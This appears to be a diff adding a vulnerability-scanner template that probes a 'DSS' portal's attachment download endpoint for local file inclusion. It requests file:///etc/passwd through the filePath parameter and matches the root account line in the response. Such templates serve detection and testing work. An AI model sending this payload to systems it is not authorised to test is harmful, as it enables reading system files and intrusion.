@@ -1,0 +1,25 @@
+id: dss-download-fileread
+
+info:
+  name: DSS Download - Local File Inclusion
+  author: ritikchaddha
+  severity: high
+  tags: lfi,dss,lfr
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/attachment_downloadByUrlAtt.action?filePath=file:///etc/passwd"
+
+    host-redirects: true
+    max-redirects: 2
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+
+      - type: status
+        status:
+          - 200
